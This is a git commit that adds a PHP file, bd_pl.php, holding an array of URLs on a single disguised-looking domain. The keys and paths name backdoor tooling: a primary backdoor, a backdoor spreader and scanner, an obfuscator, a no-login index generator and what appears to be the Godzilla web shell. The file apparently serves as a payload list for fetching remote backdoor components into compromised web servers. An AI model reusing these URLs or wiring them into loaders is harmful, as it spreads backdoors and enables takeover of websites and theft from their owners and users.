f5445e8fc17b87b002d96978e09caabf142b4346
darxbyte <123358882+darxbyte@users.noreply.github.com>
2025-01-04 06:01:36 +0700

    Create bd_pl.php

---
+++ bd_pl.php
@@ -0,0 +1,20 @@
+<?php
+$H1I3v = array(
+    "authenticated" => "https://base64-jkk12sdifjfg1asjda9sdhu2qwuhdqkw0oqsdjqq.us/authenticated",
+    "1"             => "https://base64-jkk12sdifjfg1asjda9sdhu2qwuhdqkw0oqsdjqq.us/libxxx_primary_bd",
+    "2"             => "https://base64-jkk12sdifjfg1asjda9sdhu2qwuhdqkw0oqsdjqq.us/indosec",
+	"3"             => "https://base64-jkk12sdifjfg1asjda9sdhu2qwuhdqkw0oqsdjqq.us/gecko",
+    "bds"           => "https://base64-jkk12sdifjfg1asjda9sdhu2qwuhdqkw0oqsdjqq.us/bd_spreader",
+    "gen"           => "https://base64-jkk12sdifjfg1asjda9sdhu2qwuhdqkw0oqsdjqq.us/index_file_generator_no_login",
+    "scan"          => "https://base64-jkk12sdifjfg1asjda9sdhu2qwuhdqkw0oqsdjqq.us/bd_scanner",
+    "program"       => "https://base64-jkk12sdifjfg1asjda9sdhu2qwuhdqkw0oqsdjqq.us/program",
+    "godxilla"      => "https://base64-jkk12sdifjfg1asjda9sdhu2qwuhdqkw0oqsdjqq.us/godxilla",
+    "obfuscator"    => "https://base64-jkk12sdifjfg1asjda9sdhu2qwuhdqkw0oqsdjqq.us/obfuscator",
+    "scanx"         => "https://base64-jkk12sdifjfg1asjda9sdhu2qwuhdqkw0oqsdjqq.us/scan_test",
+    "spreadx"       => "https://base64-jkk12sdifjfg1asjda9sdhu2qwuhdqkw0oqsdjqq.us/spread_test",
+    "programx"      => "https://base64-jkk12sdifjfg1asjda9sdhu2qwuhdqkw0oqsdjqq.us/program_test",
+    "test1"         => "https://base64-jkk12sdifjfg1asjda9sdhu2qwuhdqkw0oqsdjqq.us/test1",
+    "test2"         => "https://base64-jkk12sdifjfg1asjda9sdhu2qwuhdqkw0oqsdjqq.us/test2",
+    "test3"         => "https://base64-jkk12sdifjfg1asjda9sdhu2qwuhdqkw0oqsdjqq.us/test3"
+);
+?>
